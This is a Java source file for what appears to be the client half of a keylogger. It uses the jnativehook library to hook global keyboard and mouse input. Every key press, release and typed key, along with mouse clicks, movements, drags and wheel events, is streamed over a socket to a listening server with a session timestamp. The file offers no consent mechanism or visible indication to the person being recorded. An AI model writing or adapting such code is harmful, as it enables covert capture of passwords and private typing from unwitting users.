import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.jnativehook.mouse.NativeMouseEvent;
import org.jnativehook.mouse.NativeMouseInputListener;
import org.jnativehook.mouse.NativeMouseWheelEvent;
import org.jnativehook.mouse.NativeMouseWheelListener;

import java.io.*;
import java.net.*;
import java.util.Date;
import java.text.SimpleDateFormat;

public class Client extends Thread implements NativeKeyListener, NativeMouseInputListener, NativeMouseWheelListener {
    
    private static FileWriter filewriter;
    private static BufferedWriter bufferedWriter;
    private static ObjectOutputStream objectOutputStream;
    
    public void stopClient(){
        System.out.println("from client ending");
        System.exit(0);
    }

    public void run() {
        try {
            Socket socket = new Socket("localhost", 7000);
            objectOutputStream = new ObjectOutputStream(socket.getOutputStream());
            SimpleDateFormat df=new SimpleDateFormat("dd/MM/yyyy HH:mm:ss");  
            Date date = new Date();
            objectOutputStream.writeUTF("New session started at: "+df.format(date)+"\n");
            GlobalScreen.registerNativeHook();
            GlobalScreen.addNativeKeyListener(new Client());
            GlobalScreen.addNativeMouseListener(new Client());
            GlobalScreen.addNativeMouseMotionListener(new Client());
            GlobalScreen.addNativeMouseWheelListener(new Client());
            
        } catch (Exception e) {
            System.out.println(e);
        }
    }
    
    
    //native event listeners
    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {
        try {
            objectOutputStream.writeUTF("Key Typed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
            if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
                try {
                    GlobalScreen.unregisterNativeHook();
                } catch (NativeHookException nativeHookException) {
                    nativeHookException.printStackTrace();
                }
            }
        } catch (IOException f) {
            System.out.println(f);
        }
    }
    
    /*
    This method records all the pressed keys
    */
    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        try {
            objectOutputStream.writeUTF("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
        } catch (IOException f) {
            System.out.println(f);
        }
        
    }
    
    //qwerty
    /*
    This method records all the released keys
    */
    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {
        try {
            objectOutputStream.writeUTF("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
        } catch (IOException f) {
            System.out.println(f);
        }
        
    }
    
    @Override
    public void nativeMouseClicked(NativeMouseEvent nativeMouseEvent) {
    }
    
    /*
    This method records all the mouse clicks
    */
    @Override
    public void nativeMousePressed(NativeMouseEvent nativeMouseEvent) {
        try {
            objectOutputStream.writeUTF("Mouse Pressed");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    
    /*
    This method records all the mouse button released events
    */
    @Override
    public void nativeMouseReleased(NativeMouseEvent nativeMouseEvent) {
        try {
            objectOutputStream.writeUTF("Mouse Released");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    
    /*
    This method records all the mouse move coordinates
    */
    @Override
    public void nativeMouseMoved(NativeMouseEvent nativeMouseEvent) {
        try {
            objectOutputStream.writeUTF("Mouse Moved to: " + nativeMouseEvent.getX() + ", " + nativeMouseEvent.getY());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    
    /*
    This method records all the mouse dragged coordinates
    */
    @Override
    public void nativeMouseDragged(NativeMouseEvent nativeMouseEvent) {
        try {
            objectOutputStream.writeUTF("Mouse Dragged to: " + nativeMouseEvent.getX() + ", " + nativeMouseEvent.getY());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    
    /* This method records all the mouse wheel moves, direction of the move and scroll amount lol
    */
    @Override
    public void nativeMouseWheelMoved(NativeMouseWheelEvent nativeMouseWheelEvent) {
        try {
            objectOutputStream.writeUTF("Mouse Wheel Moved: " + nativeMouseWheelEvent.getWheelRotation());
        } catch (IOException e) {
            e.printStackTrace();
        }
        try {
            objectOutputStream.writeUTF("Scroll Amount: " + nativeMouseWheelEvent.getScrollAmount());
        } catch (IOException e) {
            e.printStackTrace();
        }
        try {
            objectOutputStream.writeUTF("Wheel Direction: " + nativeMouseWheelEvent.getWheelDirection());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    
    
    
}
